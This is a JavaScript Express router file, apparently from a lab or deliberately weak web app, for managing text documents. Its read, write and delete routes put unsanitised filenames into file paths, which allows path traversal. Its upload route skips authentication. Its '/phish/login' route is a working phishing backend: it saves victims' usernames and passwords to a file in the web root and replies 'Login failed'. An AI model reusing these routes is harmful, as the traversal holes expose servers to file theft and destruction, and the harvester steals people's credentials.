import express from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { verifyToken } from '../middleware/auth.js';
import multer from 'multer';


const router = express.Router();
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);


// Directory path for documents
//const directoryPath = 'C:/nginx-1.27.0/html';
const directoryPath = 'C:/Users/Administrator/Downloads/UploadedDocuments';
const PhishCredsPath = 'C:/nginx-1.27.0/html/PhishingCredentials.txt';
// Ensure the directory exists
if (!fs.existsSync(directoryPath)) {
    fs.mkdirSync(directoryPath);
}

// Fetch all text documents
router.get('/fetch', verifyToken, (req, res) => {
    fs.readdir(directoryPath, (err, files) => {
        if (err) {
            console.error('Error reading directory:', err);
            return res.status(500).json({ error: 'Failed to fetch documents' });
        }

        const txtFiles = files.filter(file => path.extname(file) === '.txt');
        res.json(txtFiles);
    });
});

// Create a new document
router.post('/create', verifyToken, (req, res) => {
    const { filename, content } = req.body;

    if (!filename || !content) {
        return res.status(400).json({ error: 'Filename and content are required' });
    }

    const filePath = path.join(directoryPath, filename);

    fs.writeFile(filePath, content, 'utf8', (err) => {
        if (err) {
            console.error('Error writing to file:', err);
            return res.status(500).json({ error: 'Failed to create document' });
        }
        res.json({ message: 'Document created successfully' });
    });
});

// Read a document
router.get('/read/:filename', verifyToken, (req, res) => {
    const { filename } = req.params;
    const filePath = path.join(directoryPath, filename);

    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Error reading file:', err);
            return res.status(500).json({ error: 'Failed to read document' });
        }
        res.json({ content: data });
    });
});
router.get('/view/:filename',verifyToken ,(req, res) => {
    const { filename } = req.params;
    const filePath = path.join(directoryPath, filename);

    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Error reading file:', err);
            return res.status(500).json({ error: 'Failed to read file' });
        }
        res.json({ content: data });
    });
});

// Update a document
router.put('/update', verifyToken, (req, res) => {
    const { filename, content } = req.body;

    if (!filename || !content) {
        return res.status(400).json({ error: 'Filename and content are required' });
    }

    const filePath = path.join(directoryPath, filename);

    fs.writeFile(filePath, content, 'utf8', (err) => {
        if (err) {
            console.error('Error updating file:', err);
            return res.status(500).json({ error: 'Failed to update document' });
        }
        res.json({ message: 'Document updated successfully' });
    });
});

// Delete a document
router.delete('/delete/:filename', verifyToken, (req, res) => {
    const { filename } = req.params;
    const filePath = path.join(directoryPath, filename);

    fs.unlink(filePath, (err) => {
        if (err) {
            console.error('Error deleting file:', err);
            return res.status(500).json({ error: 'Failed to delete document' });
        }
        res.json({ message: 'Document deleted successfully' });
    });
});

// Configure multer for file upload
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, directoryPath);  // Use the custom directoryPath as the destination
    },
    filename: (req, file, cb) => {
        const uniqueName = `${Date.now()}-${file.originalname}`;  // Generate a unique filename
        cb(null, uniqueName);  // Save the file with the unique name
    },
});
// #region uploadFilter
// File filter function to allow only .txt files
const fileFilter = (req, file, cb) => {
    const allowedTypes = /text\/plain/;  // Only allow plain text files (.txt)
    const isValid = allowedTypes.test(file.mimetype);

    if (isValid) {
        cb(null, true);  // Accept the file
    } else {
        cb(new Error('Invalid file type. Only .txt files are allowed.'), false);  // Reject the file
    }
};
const upload = multer({
    storage: storage,
    fileFilter: fileFilter,  // Add the file filter to the multer config
});
// #endregion
// uncomment below for upload without filter and comment ablove upload
// const upload = multer({
//     storage: storage
// });

// Upload document API
router.post('/upload', upload.single('document'), (req, res) => {
    if (!req.file) {
        return res.status(400).json({ error: 'No file uploaded' });
    }

    const filePath = req.file.path;  // Path where the file is saved
    console.log('File uploaded:', filePath);

    res.status(200).json({
        message: 'File uploaded successfully',
        filename: req.file.filename, // Send the file name as a response
    });
});

router.post('/phish/login', async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ error: 'Username and password are required' });
    }

    try {
        // Read the existing file contents
        let fileContent = '';
        // try {
        //     fileContent = await fs.readFile(PhishCredsPath, 'utf-8');
        // } catch (err) {
        //     if (err.code !== 'ENOENT') {
        //         console.error('Error reading file:', err);
        //         return res.status(500).json({ error: 'Internal server error' });
        //     }
        // }

        // Append the new credentials to the existing content
        const newContent = `${fileContent}\nUsername: ${username}, Password: ${password}`;

        // Write the updated content back to the file
        //await fs.writeFile(PhishCredsPath, newContent.trim(), 'utf-8');
        fs.writeFile(PhishCredsPath, newContent, 'utf8', (err) => {
            if (err) {
                console.error('Error updating file:', err);
                return res.status(500).json({ error: 'Failed to update document' });
            }
            res.json({ message: 'Document updated successfully' });
        });

        res.status(200).json({ message: 'Login failed. Please try again.' });
    } catch (err) {
        console.error('Error writing to file:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});


export default router;
